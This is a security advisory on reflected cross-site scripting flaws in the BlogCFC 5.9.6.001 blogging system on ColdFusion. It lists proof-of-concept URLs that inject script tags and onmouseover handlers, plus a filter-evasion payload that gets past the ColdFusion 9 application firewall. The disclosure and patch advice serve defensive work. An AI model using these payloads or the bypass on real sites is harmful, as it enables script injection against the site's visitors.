* Description
BlogCFC is a ColdFusion based blogging System.Procheckup has discovered that Various BlogCFC programs are vulnerable to generic reflective Cross Site Scripting (XSS) attacks.



Note: BlogCFC was tested on a fully patched Windows XP machine, ColdFusion 8 (unpatched) and SQL 2005 were used from the application server and the backend database.



Note: Coldfusion 9 includes a application firewall and will replace any <script> tag, To circumvent this the

      <script>alert(1)</script> needs to be substituted with a tag not on the match list like </XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/")> (this works on IE7 & IE6)

      BlogCFC Versions tested
      5.9.6.001

    * Proof of concept
      Unauthenticated vanilla XSS. IE7 (Internet Explorer) browser used.

      http://target-domain.foo/tags/podlayout.cfm?ATTRIBUTES.TITLE=<script>alert(1)</script>&thistag.EXECUTIONMODE=start

      http://target-domain.foo/tags/textarea.cfm?attributes.class="></textarea><script>alert(1)</script>&attributes.fieldname=Procheckup&attributes.style=1&attributes.value=1&

      http://target-domain.foo/includes/pods/subscribe.cfm?errorMessage="><script>alert(1)</script>

      http://target-domain.foo/index.cfm?errorMessage="><script>alert(1)</script>

      The following works due to the error page not sufficiently filtering tags on unpatched Coldfusion 8
      http://target-domain.foo/stats.cfm?dur='</XSS STYLE=xss:expression(location='http://www.procheckup.com')>



      The following examples the Mouse has to be moved over the subscribe input box

      http://target-domain.foo/includes/pods/subscribe.cfm?"onmouseover="alert(1);

      http://target-domain.foo/index.cfm?"onmouseover="alert(1);

      http://target-domain.foo/search.cfm?"onmouseover="alert(1);

      http://target-domain.foo/stats.cfm?"onmouseover="alert(1);

      http://target-domain.foo/statsbyyear.cfm?"onmouseover="alert(1);

      http://target-domain.foo/tags/getpods.cfm?"onmouseover="alert(1);
    * How to fix
      Apply the latest patched version.
